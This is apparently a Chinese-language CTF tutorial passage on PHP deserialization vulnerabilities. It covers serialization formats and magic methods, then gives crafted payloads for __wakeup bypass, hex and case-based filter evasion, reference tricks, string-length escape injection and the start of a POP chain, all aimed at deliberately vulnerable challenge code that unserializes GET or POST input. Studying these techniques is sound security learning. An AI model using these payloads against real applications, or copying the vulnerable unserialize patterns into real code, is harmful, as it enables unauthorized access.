<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	//创建一个类</span><br><span class="line">	Class Stu &#123;</span><br><span class="line">		public $name = &#x27; &#x27;;</span><br><span class="line">		public $age = 0;</span><br><span class="line">		//定义一个公共访问接口</span><br><span class="line">		public function say($name,$age)&#123;</span><br><span class="line">			$this-&gt;name = $name;</span><br><span class="line">			$this-&gt;age = $age;</span><br><span class="line">			return &#x27;我的名字是&#x27;.$this-&gt;name.</span><br><span class="line">						&#x27;今年我&#x27;.$this-&gt;age;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	//实例化两个对象</span><br><span class="line">	$jack = new Stu();</span><br><span class="line">	$smith = new Stu();</span><br><span class="line">	echo $jack-&gt;say(&#x27;jack&#x27;,30);</span><br><span class="line">	echo $smith-&gt;say(&#x27;smith&#x27;,20);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title="::"></a>::</h3><p><code>::</code>用来直接调用类中的属性或方法，没有实例化)</p>
<p><strong>实例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	Class b &#123;</span><br><span class="line">		var $name = &quot;test&quot;;</span><br><span class="line">		Function getName()&#123;</span><br><span class="line">			echo &#x27;test is good&#x27;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">//直接调用</span><br><span class="line">echo b::getName();//输出为test is good</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="什么是序列化，什么是反序列化？"><a href="#什么是序列化，什么是反序列化？" class="headerlink" title="什么是序列化，什么是反序列化？"></a>什么是序列化，什么是反序列化？</h2><h3 id="php序列化：serialize"><a href="#php序列化：serialize" class="headerlink" title="php序列化：serialize()"></a>php序列化：<code>serialize()</code></h3><p>序列化是将变量或对象转换成字符串的过程，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</p>
<p>php序列化的字母标识：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a - <span class="keyword">array</span></span><br><span class="line">b - <span class="keyword">boolean</span></span><br><span class="line">d - <span class="keyword">double</span></span><br><span class="line">i - <span class="keyword">integer</span></span><br><span class="line">o - common <span class="keyword">object</span></span><br><span class="line">r - reference</span><br><span class="line">s - <span class="keyword">string</span></span><br><span class="line">C - custom <span class="keyword">object</span></span><br><span class="line">O - <span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">N</span> - <span class="title">null</span></span></span><br><span class="line"><span class="class"><span class="title">R</span> - <span class="title">pointer</span> <span class="title">reference</span></span></span><br><span class="line"><span class="class"><span class="title">U</span> - <span class="title">unicode</span> <span class="title">string</span></span></span><br><span class="line"><span class="class"><span class="title">N</span> - <span class="title">NULL</span></span></span><br></pre></td></tr></table></figure>
<h4 id="实列及详解"><a href="#实列及详解" class="headerlink" title="实列及详解"></a>实列及详解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class TEST&#123;  </span><br><span class="line"> public $test1=&quot;11&quot;;  </span><br><span class="line"> private $test2=&quot;22&quot;;  </span><br><span class="line"> protected $test3=&quot;33&quot;;  </span><br><span class="line"> public function test4()  </span><br><span class="line"> &#123;  </span><br><span class="line"> echo $this-&gt;test1;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=new TEST();  </span><br><span class="line">echo serialize($a); </span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">o:4:&quot;TEST&quot;:3:&#123;s:5:&quot;test1&quot;;s:2:&quot;11&quot;;s:11:&quot; TEST test2&quot;;s:2:&quot;22&quot;;s:8:&quot; * test3&quot;;s:2:&quot;33&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>详解：</p>
<ul>
<li><code>o</code>代表类，<code>4</code>代表类名长度，<code>&quot;&quot;</code>中是类名</li>
<li><code>3</code>表示类中的变量个数，<code>&#123;&#125;</code>中则是以<code>类型：长度：&quot;值&quot;</code>为格式依次展示类中变量</li>
</ul>
<p><strong>注意序列化后的内容只有成员变量，没有成员函数，比如下面的例子：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;xiaoshizi&quot;;</span><br><span class="line">        $this-&gt;b = &quot;laoshizi&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function happy()&#123;</span><br><span class="line">        return $this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;xiaoshizi&quot;;s:1:&quot;b&quot;;s:8:&quot;laoshizi&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意类中变量前的函数</strong></p>
<ul>
<li><p>如果是public，则直接输出</p>
</li>
<li><p>如果变量前是protected，则会在变量名前加上 <code>\x00*\x00</code></p>
</li>
<li><p>如果变量前是private，则会在变量名前加上 <code>\x00类名\x00属性名</code></p>
</li>
</ul>
<p>如果直接输出，则会导致不可见字符 <code>\x00</code> 丢失变成空格 <code>  </code></p>
<h3 id="php反序列化：unserialize"><a href="#php反序列化：unserialize" class="headerlink" title="php反序列化：unserialize()"></a>php反序列化：<code>unserialize()</code></h3><p>反序列化是将字符串转换成变量或对象的过程</p>
<p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。这样说可能还不是很具体，举个列子比如你网购买一个架子，发货为节省成本，是拆开给你发过去，到你手上，然后给你说明书让你组装，拆开给你这个过程可以说是序列化，你组装的过程就是反序列化.</p>
<h4 id="实列及详解-1"><a href="#实列及详解-1" class="headerlink" title="实列及详解"></a>实列及详解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class people</span><br><span class="line">&#123;</span><br><span class="line"> public $name = &quot;f1r3K0&quot;;</span><br><span class="line"> public $age = &#x27;18&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$class =  new people();</span><br><span class="line">$class_ser = serialize($class);</span><br><span class="line">print_r($class_ser);</span><br><span class="line">$class_unser = unserialize($class_ser);</span><br><span class="line">print_r($class_unser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;people&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;f1r3K0&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br><span class="line">people Object</span><br><span class="line">(</span><br><span class="line">    [name] =&gt; f1r3K0</span><br><span class="line">    [age] =&gt; 18</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>注意当使用 <code>unserialize()</code> 恢复对象时， 将调用 <code>__wakeup()</code> 成员函数</strong></p>
<h4 id="Magic-function"><a href="#Magic-function" class="headerlink" title="Magic function"></a>Magic function</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct //当一个对象创建时被调用，即在程序的开头被调用</span><br><span class="line">__destruct //当一个对象销毁时被调用，即在程序的结尾被调用</span><br><span class="line">__toString //当一个对象被当作一个字符串被调用</span><br><span class="line">__wakeup() //使用unserialize时触发</span><br><span class="line">__sleep() //使用serialize时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //对不存在的方法或者不可访问的方法进行调用就自动调用</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<p>魔术方法指的是一种特殊方法当对对象执行某些操作时会覆盖 PHP 的默认操作</p>
<p>重点关注以下几个：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</span><br><span class="line">__destruct()：析构函数，类似于C++。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行，当对象被销毁时会自动调用。</span><br><span class="line">__wakeup()：如前所提，unserialize()时会检查是否存在 __wakeup()，如果存在，则会优先调用 __wakeup()方法。</span><br><span class="line">__toString():用于处理一个类被当成字符串时应怎样回应，因此当一个对象被当作一个字符串时就会调用。</span><br><span class="line">__sleep():用于提交未提交的数据，或类似的清理操作，因此当一个对象被序列化的时候被调用。</span><br></pre></td></tr></table></figure>

<h5 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h5><p>简单描述就是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p>
<p><strong>实列及详解</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include &#x27;class.php&#x27;;  </span><br><span class="line">$select = $_GET[&#x27;select&#x27;];  </span><br><span class="line">$res=unserialize(@$select); //将@放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</span><br><span class="line"></span><br><span class="line">&lt;?php  </span><br><span class="line">include &#x27;flag.php&#x27;;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;  </span><br><span class="line"> private $username = &#x27;nonono&#x27;;  </span><br><span class="line"> private $password = &#x27;yesyes&#x27;;  </span><br><span class="line"></span><br><span class="line"> public function __construct($username,$password)&#123;  </span><br><span class="line"> $this-&gt;username = $username;  </span><br><span class="line"> $this-&gt;password = $password;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> function __wakeup()&#123;  </span><br><span class="line"> $this-&gt;username = &#x27;guest&#x27;;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> function __destruct()&#123;  </span><br><span class="line"> if ($this-&gt;password != 100) &#123;  </span><br><span class="line"> echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;  </span><br><span class="line"> echo &quot;You name is: &quot;;  </span><br><span class="line"> echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;  </span><br><span class="line"> echo &quot;You password is: &quot;;  </span><br><span class="line"> echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;  </span><br><span class="line"> die();  </span><br><span class="line"> &#125;  </span><br><span class="line"> if ($this-&gt;username === &#x27;admin&#x27;) &#123;  </span><br><span class="line"> global $flag;  </span><br><span class="line"> echo $flag;  </span><br><span class="line"> &#125;else&#123;  </span><br><span class="line"> echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;  </span><br><span class="line"> die();  </span><br><span class="line"></span><br><span class="line"> &#125;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看源码我们需要<code>password=100，username=admin</code>。如果单纯输入<code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot; Name username&quot;;s:5:&quot;admin&quot;;s:14:&quot; Name password&quot;;s:3:&quot;100&quot;;&#125;</code>反序列化过程中<code>__wakeup</code>方法里会把username赋值为guest。此时我们要修改类数使其大于2，就可以绕过<code>__wakeup</code>方法。注意是用<code>GET</code>方式，但是别忘了要Url编码。</p>
<p>如何偷懒得到序列化格式？直接在源码后面编个脚本就行啦！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new Name(&#x27;admin&#x27;,&#x27;100&#x27;);  </span><br><span class="line">echo serialize($a);  </span><br><span class="line">echo urlencode(serialize($a));  </span><br></pre></td></tr></table></figure>
<p>最终输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Url/?select = O%3A4%3A%22Name%22%3A4%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure>

<h5 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:4:&quot;test&quot;:2:&#123;S:4:&quot;%00*%00\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h6 id="实例及详解"><a href="#实例及详解" class="headerlink" title="实例及详解"></a>实例及详解</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;admin&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function  __destruct()&#123;</span><br><span class="line">        echo 666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function check($data)&#123;</span><br><span class="line">    if(stristr($data, &#x27;username&#x27;)!==False)&#123;</span><br><span class="line">        echo(&quot;你绕不过！！&quot;.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由代码可知：username被ban了。</p>
<p>原代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>转换后为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>75是u的16进制编码。</p>
<h5 id="php类名大小写绕过"><a href="#php类名大小写绕过" class="headerlink" title="php类名大小写绕过"></a>php类名大小写绕过</h5><p>php类名对大小写不敏感，而且过滤并没有过滤大小写</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;  </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;  </span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;  </span><br><span class="line"><span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"><span class="keyword">global</span> <span class="variable">$flag</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;  </span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显是触发析构函数就得到了flag，但是有过滤，如果匹配到了ctfshow就抛异常。所以可以构造CTFSHOW来绕过。</p>
<h5 id="号绕过"><a href="#号绕过" class="headerlink" title="+号绕过"></a>+号绕过</h5><h5 id="利用-使两值恒等"><a href="#利用-使两值恒等" class="headerlink" title="利用&amp;使两值恒等"></a>利用&amp;使两值恒等</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);  </span><br><span class="line">include(&#x27;flag.php&#x27;);  </span><br><span class="line">highlight_file(__FILE__);  </span><br><span class="line">class ctfshowAdmin&#123;  </span><br><span class="line">public $token;  </span><br><span class="line">public $password;  </span><br><span class="line"></span><br><span class="line">public function __construct($t,$p)&#123;  </span><br><span class="line">$this-&gt;token=$t;  </span><br><span class="line">$this-&gt;password = $p;  </span><br><span class="line">&#125;  </span><br><span class="line">public function login()&#123;  </span><br><span class="line">return $this-&gt;token===$this-&gt;password;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);  </span><br><span class="line">$ctfshow-&gt;token=md5(mt_rand());  </span><br><span class="line"></span><br><span class="line">if($ctfshow-&gt;login())&#123;  </span><br><span class="line">echo $flag;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$ctfshow-&gt;login()</code>这个成立才给<code>flag</code>，<code>$ctfshow-&gt;token=md5(mt_rand())</code>但是是随机的</p>
<p>知识点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;11&#x27;</span>;  </span><br><span class="line"><span class="variable">$b</span>=&amp;<span class="variable">$a</span>;  </span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;<span class="comment">//$b被赋值的是变量a的地址，php是按地址传参，a的值会随b值变化  </span></span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<p>故可以用如下脚本达成目的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;  </span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$token</span>;  </span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$password</span>;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"> <span class="variable language_">$this</span>-&gt;password = &amp;<span class="variable language_">$this</span>-&gt;token;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();  </span><br><span class="line"><span class="keyword">echo</span> ( <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>

<h4 id="反序列化逃逸问题"><a href="#反序列化逃逸问题" class="headerlink" title="反序列化逃逸问题"></a>反序列化逃逸问题</h4><p>逃逸问题的本质是改变序列化字符串的长度，导致反序列化漏洞</p>
<p>所以会有两种情况，一种是由长变短,一种是由短变长</p>
<h5 id="由短变长"><a href="#由短变长" class="headerlink" title="由短变长"></a>由短变长</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function change($str)&#123;</span><br><span class="line">    return str_replace(&quot;x&quot;,&quot;xx&quot;,$str);</span><br><span class="line">&#125;</span><br><span class="line">$name = $_GET[&#x27;name&#x27;];</span><br><span class="line">$age = &quot;I am 11&quot;;</span><br><span class="line">$arr = array($name,$age);</span><br><span class="line">echo &quot;反序列化字符串：&quot;;</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;过滤后:&quot;;</span><br><span class="line">$old = change(serialize($arr));</span><br><span class="line">$new = unserialize($old);</span><br><span class="line">var_dump($new);</span><br><span class="line">echo &quot;&lt;br/&gt;此时，age=$new[1]&quot;;</span><br></pre></td></tr></table></figure>

<p>正常传入<code>name = mao</code>，输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(38) &quot;a:2:&#123;i:0;s:3:&quot;mao&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(3) &quot;mao&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;I am 11&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=I am 11</span><br></pre></td></tr></table></figure>

<p>当传入<code>name = maox</code>时，就会出错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(39) &quot;a:2:&#123;i:0;s:4:&quot;maox&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:bool(false)</span><br><span class="line">&lt;br/&gt;此时，age=</span><br></pre></td></tr></table></figure>

<p>我们传入<code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>时，反而有输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(79) &quot;a:2:&#123;i:0;s:43:&quot;maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(43) &quot;maoxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(6) &quot;woaini&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=woaini</span><br></pre></td></tr></table></figure>

<p>这是为什么？</p>
<p>在反序列化时，底层代码是以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾。</p>
<p><code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>这一部分一共二十个字符，由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>，从而造成<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>的溢出，而<code>&quot;</code>闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出<code>woaini</code>。最后的<code>;&#125;</code>闭合反序列化全过程导致原来的<code>&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</code>被舍弃，不影响反序列化过程。</p>
<h5 id="由长变短"><a href="#由长变短" class="headerlink" title="由长变短"></a>由长变短</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function change($str)&#123;</span><br><span class="line">    return str_replace(&quot;xx&quot;,&quot;x&quot;,$str);</span><br><span class="line">&#125;</span><br><span class="line">$arr[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">$arr[&#x27;age&#x27;] = $_GET[&#x27;age&#x27;];</span><br><span class="line">echo &quot;反序列化字符串：&quot;;</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;过滤后:&quot;;</span><br><span class="line">$old = change(serialize($arr));</span><br><span class="line">var_dump($old);</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">$new = unserialize($old);</span><br><span class="line">var_dump($new);</span><br><span class="line">echo &quot;&lt;br/&gt;此时，age=&quot;;</span><br><span class="line">echo $new[&#x27;age&#x27;];</span><br></pre></td></tr></table></figure>

<p>正常情况传入<code>name=mao&amp;age=11</code>，输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(46) &quot;a:2:&#123;s:4:&quot;name&quot;;s:3:&quot;mao&quot;;s:3:&quot;age&quot;;s:2:&quot;11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:string(46) &quot;a:2:&#123;s:4:&quot;name&quot;;s:3:&quot;mao&quot;;s:3:&quot;age&quot;;s:2:&quot;11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;array(2) &#123;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(3) &quot;mao&quot;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  string(2) &quot;11&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=11</span><br></pre></td></tr></table></figure>

<p>我们传入<code>name=maoxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;</code>时，输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(46) &quot;a:2:&#123;s:4:&quot;name&quot;;s:43:&quot;maoxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;s:3:&quot;age&quot;;s:28:&quot;11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:string(94) &quot;a:2:&#123;s:4:&quot;name&quot;;s:43:&quot;maoxxxxxxxxxxxxxxxxxxxx&quot;;s:3:&quot;age&quot;;s:28:&quot;11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;array(2) &#123;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(43) &quot;maoxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  string(6) &quot;woaini&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=woaini</span><br></pre></td></tr></table></figure>

<p>由于前面是40个x所以导致少了20个字符，所以需要后面来补上，<code>&quot;;s:3:&quot;age&quot;;s:28:&quot;11</code>这一部分刚好20个，后面由于有<code>&quot;</code>闭合了前面因此后面的参数就可以由我们自定义执行了。</p>
<h4 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h4><p> 前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
<p><strong>实列及讲解</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line"></span><br><span class="line">    public function Getflag()&#123;</span><br><span class="line">        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &#x27;nono&#x27;;</span><br><span class="line">        